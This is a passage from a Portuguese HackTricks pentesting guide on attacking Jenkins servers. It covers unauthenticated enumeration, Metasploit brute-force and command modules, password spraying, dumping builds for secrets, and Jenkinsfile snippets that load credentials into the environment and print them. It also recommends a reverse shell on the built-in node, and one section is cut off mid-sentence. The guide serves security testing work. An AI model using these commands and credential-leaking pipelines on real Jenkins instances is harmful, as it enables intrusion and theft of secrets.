# Seguran√ßa do Jenkins

<details>

<summary><strong>Apoie o HackTricks e obtenha benef√≠cios!</strong></summary>

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou se quiser acessar a **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Obtenha o [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) **e** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **reposit√≥rios do github.**

</details>

## Informa√ß√µes b√°sicas

O Jenkins oferece uma maneira simples de configurar um ambiente de **integra√ß√£o cont√≠nua** ou **entrega cont√≠nua** (CI/CD) para quase **qualquer** combina√ß√£o de **linguagens** e reposit√≥rios de c√≥digo-fonte usando pipelines, al√©m de automatizar outras tarefas rotineiras de desenvolvimento. Embora o Jenkins n√£o elimine a **necessidade de criar scripts para etapas individuais**, ele oferece uma maneira mais r√°pida e robusta de integrar toda a sua cadeia de ferramentas de compila√ß√£o, teste e implanta√ß√£o do que voc√™ pode facilmente construir sozinho.\
Defini√ß√£o da [qui](https://www.infoworld.com/article/3239666/what-is-jenkins-the-ci-server-explained.html).

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Enumera√ß√£o n√£o autenticada

Para procurar p√°ginas interessantes do Jenkins sem autentica√ß√£o como (_/people_ ou _/asynchPeople_, que lista os usu√°rios atuais) voc√™ pode usar:

```
msf> use auxiliary/scanner/http/jenkins_enum
```

Verifique se voc√™ pode executar comandos sem precisar de autentica√ß√£o:

```
msf> use auxiliary/scanner/http/jenkins_command
```

Sem credenciais, voc√™ pode olhar dentro do caminho _**/asynchPeople/**_ ou _**/securityRealm/user/admin/search/index?q=**_ para **nomes de usu√°rio**.

Voc√™ pode ser capaz de obter a vers√£o do Jenkins a partir do caminho _**/oops**_ ou _**/error**_

![](<../../.gitbook/assets/image (48).png>)

### Vulnerabilidades conhecidas

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Login

Nas informa√ß√µes b√°sicas, voc√™ pode verificar **todas as maneiras de fazer login no Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registro

Voc√™ poder√° encontrar inst√¢ncias do Jenkins que **permitem que voc√™ crie uma conta e fa√ßa login nela. T√£o simples quanto isso.**

### Login SSO

Tamb√©m, se a **funcionalidade/plugins SSO** estiver presente, voc√™ deve tentar **fazer login** na aplica√ß√£o usando uma conta de teste (ou seja, uma conta de **Github/Bitbucket** de teste). Truque da [**qui**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### For√ßa bruta

O **Jekins** n√£o implementa nenhuma **pol√≠tica de senha** ou **mitiga√ß√£o de for√ßa bruta de nome de usu√°rio**. Ent√£o, voc√™ **sempre deve tentar** fazer **for√ßa bruta** em usu√°rios porque provavelmente est√£o sendo usadas **senhas fracas** (at√© mesmo **nomes de usu√°rio como senhas** ou **nomes de usu√°rio invertidos como senhas**).

```
msf> use auxiliary/scanner/http/jenkins_login
```

### Password spraying

Use [este script python](https://github.com/gquere/pwn\_jenkins/blob/master/password\_spraying/jenkins\_password\_spraying.py) ou [este script powershell](https://github.com/chryzsh/JenkinsPasswordSpray).

### Bypass de lista branca de IP

Muitas organiza√ß√µes combinam **sistemas de gerenciamento de controle de origem (SCM) baseados em SaaS** (como GitHub ou GitLab) com uma solu√ß√£o **CI** interna e auto-hospedada (por exemplo, Jenkins, TeamCity), permitindo que esses sistemas CI recebam eventos de webhook dos fornecedores de controle de origem SaaS, com o simples objetivo de acionar trabalhos de pipeline.

Portanto, as organiza√ß√µes **listam em lista branca** os **intervalos de IP do SCM** permitindo que eles alcancem o sistema CI **interno com webhooks**. No entanto, observe como **qualquer pessoa** pode criar uma **conta** no Github ou Gitlab e faz√™-la **acionar um webhook** que poderia enviar uma solicita√ß√£o para esse **sistema CI interno**.

{% content-ref url="scm-ip-whitelisting-bypass.md" %}
[scm-ip-whitelisting-bypass.md](scm-ip-whitelisting-bypass.md)
{% endcontent-ref %}

## Abusos internos do Jenkins

Nesses cen√°rios, vamos supor que voc√™ tenha uma conta v√°lida para acessar o Jenkins.

{% hint style="warning" %}
Dependendo do mecanismo de **Autoriza√ß√£o** configurado no Jenkins e da permiss√£o do usu√°rio comprometido, voc√™ **pode ou n√£o ser capaz de executar os seguintes ataques**.
{% endhint %}

Para mais informa√ß√µes, verifique as informa√ß√µes b√°sicas:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Listando usu√°rios

Se voc√™ acessou o Jenkins, pode listar outros usu√°rios registrados em [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Despejando builds para encontrar segredos em texto claro

Use [este script](https://github.com/gquere/pwn\_jenkins/blob/master/dump\_builds/jenkins\_dump\_builds.py) para despejar sa√≠das de console de build e vari√°veis de ambiente de build para encontrar segredos em texto claro.

```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```

### Roubo de credenciais SSH

Se o usu√°rio comprometido tiver **
### Verificando vari√°veis de ambiente

√â poss√≠vel declarar **vari√°veis de ambiente em texto claro** para todo o pipeline ou para est√°gios espec√≠ficos. Essas vari√°veis de ambiente **n√£o devem conter informa√ß√µes confidenciais**, mas um atacante sempre pode **verificar todas as configura√ß√µes do pipeline**/Jenkinsfiles:

```bash
pipeline {
    agent {label 'built-in'}
    environment {
        GENERIC_ENV_VAR = "Test pipeline ENV variables."
    }

    stages {
        stage("Build") {
                environment {
                    STAGE_ENV_VAR = "Test stage ENV variables."
                }
                steps {
```

### Vazando segredos

Para obter informa√ß√µes sobre como os segredos s√£o tratados pelo Jenkins, confira as informa√ß√µes b√°sicas:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

As credenciais podem ser **escopadas para provedores globais** (`/credentials/`) ou para **projetos espec√≠ficos** (`/job/<nome-do-projeto>/configure`). Portanto, para exfiltrar todos eles, voc√™ precisa **comprometer pelo menos todos os projetos** que cont√™m segredos e executar pipelines personalizados/envenenados.

H√° outro problema, para obter um **segredo dentro do env** de um pipeline, voc√™ precisa **saber o nome e o tipo do segredo**. Por exemplo, se voc√™ tentar **carregar** um **segredo** **`usernamePassword`** como um **segredo** **`string`**, voc√™ receber√° este **erro**:

```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```

Aqui est√° a maneira de carregar alguns tipos comuns de segredos:

```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
    sh '''
        env #Procurar por USERNAME e PASS
    '''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
    sh '''
        env #Procurar por SECRET
    '''                 
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
    sh '''
        env # Procurar por USERPASS
    '''
}

# Voc√™ tamb√©m pode carregar v√°rias vari√°veis de ambiente de uma s√≥ vez
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
                 string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
     sh '''
        env
    '''
}
```

No final desta p√°gina, voc√™ pode **encontrar todos os tipos de credenciais**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
A melhor maneira de **vazar todos os segredos de uma vez** √© **comprometer** a **m√°quina Jenkins** (executando um shell reverso no **n√≥ integrado**, por exemplo) e, em seguida, **vazar** as **chaves mestras** e os **segredos criptografados** e descriptograf√°-los offline.\
Mais informa√ß√µes sobre como fazer isso na se√ß√£o [Nodes & Agents](./#nodes-and-agents) e na se√ß√£o [Post Exploitation](./#post-exploitation).
{% endhint %}

### Gatilhos

De [documenta√ß√£o](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): A diretiva `triggers` define as **maneiras automatizadas pelas quais o Pipeline deve ser reativado**. Para Pipelines que est√£o integrados com uma fonte como GitHub ou BitBucket, `triggers` podem n√£o ser necess√°rios, pois a integra√ß√£o baseada em webhooks provavelmente j√° estar√° presente. Os gatilhos atualmente dispon√≠veis s√£o `cron`, `pollSCM` e `upstream`.

Exemplo de cron:

```bash
triggers { cron('H */4 * * 1-5') }
```

Confira **outros exemplos na documenta√ß√£o**.

### N√≥s e agentes

Uma **inst√¢ncia do Jenkins** pode ter **diferentes agentes executando em m√°quinas diferentes**. Do ponto de vista de um atacante, o acesso a diferentes m√°quinas significa **diferentes credenciais de nuvem potenciais** para roubar ou **diferente acesso √† rede** que pode ser abusado para explorar outras m√°quinas.

Para mais informa√ß√µes, confira as informa√ß√µes b√°sicas:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Voc√™ pode enumerar os **n√≥s configurados** em `/computer/`, voc√™ geralmente encontrar√° o **`N√≥ Integrado`** (que √© o n√≥ executando o Jenkins) e potencialmente mais:

![](<../../.gitbook/assets/image (25).png>)

√â **especialmente interessante comprometer o n√≥ integrado** porque ele cont√©m informa√ß√µes confidenciais do Jenkins.

Para indicar que voc√™ deseja **executar** o **pipeline** no **n√≥ Jenkins integrado**, voc√™ pode especificar dentro do pipeline a seguinte configura√ß√£o:

```bash
pipeline {
    agent {label 'built-in'}
```

### Exemplo completo

Pipeline em um agente espec√≠fico, com um gatilho cron, com vari√°veis de ambiente de pipeline e est√°gio, carregando 2 vari√°veis em um passo e enviando um shell reverso:

```bash
pipeline {
    agent {label 'built-in'}
    triggers { cron('H */4 * * 1-5') }
    environment {
        GENERIC_ENV_VAR = "Test pipeline ENV variables."
    }

    stages {
        stage("Build") {
                environment {
                    STAGE_ENV_VAR = "Test stage ENV variables."
                }
                steps {
            withCredentials([usernamePassword(credentialsId: 'amazon', username